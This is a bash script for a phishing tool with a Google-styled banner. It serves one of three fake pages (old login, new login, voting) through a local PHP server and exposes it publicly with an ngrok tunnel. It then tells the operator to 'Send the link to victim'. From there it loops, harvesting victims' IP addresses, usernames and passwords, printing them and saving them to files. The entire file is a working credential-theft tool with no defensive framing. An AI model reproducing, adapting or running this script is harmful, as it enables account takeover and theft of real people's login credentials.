#!/bin/bash
trap 'printf "\n";stop;exit 1' 2

banner(){
clear

echo -e "\e[92m    _____    ____     ____     _____   _        ______ "
echo -e "\e[92m   / ____|  / __ \   / __ \   / ____| | |      |  ____|"
echo -e "\e[92m  | |  __  | |  | | | |  | | | |  __  | |      | |__ "
echo -e "\e[92m  | | |_ | | |  | | | |  | | | | |_ | | |      |  __| "
echo -e "\e[92m  | |__| | | |__| | | |__| | | |__| | | |____  | |____"
echo -e "\e[92m   \_____|  \____/   \____/   \_____| |______| |______|"

#####################################################
printf "\n"
printf "\n"
}
menu() {
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Old Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m New Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Voting Page   \e[0m\n"
printf "\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Option: \e[0m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
chool=".1"
start_n
elif [[ $option == 2 || $option == 02 ]]; then
chool=".2"
start_n
elif [[ $option == 3 || $option == 03 ]]; then
chool=".3"
start_n
elif [[ $option == x || $option == X ]]; then
clear
exit
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 0.3
banner
menu
fi
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start_n() {
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
cd $chool && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
found
}
found() {
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
printf "\n"
while [ true ]; do
if [[ -e "$chool/ip.txt" ]]; then
printf "\n"
printf "\n"
c_ip
rm -rf $chool/ip.txt
fi
sleep 0.75
if [[ -e "$chool/usernames.txt" ]]; then
printf "\n"
c_cred
rm -rf $chool/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch $chool/login_info.txt
ip=$(grep -a 'IP:' $chool/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m IP Address:\e[0m\e[1;96m %s\e[0m\n" $ip
cat $chool/ip.txt >> $chool/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Username:.*' $chool/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' $chool/usernames.txt | cut -d " " -f2)

printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Username:\e[0m\e[1;96m %s\n\e[0m" $account
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
cat $chool/usernames.txt >> $chool/login_info.txt
printf "\e[0m\n"
printf "\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
}
banner

menu
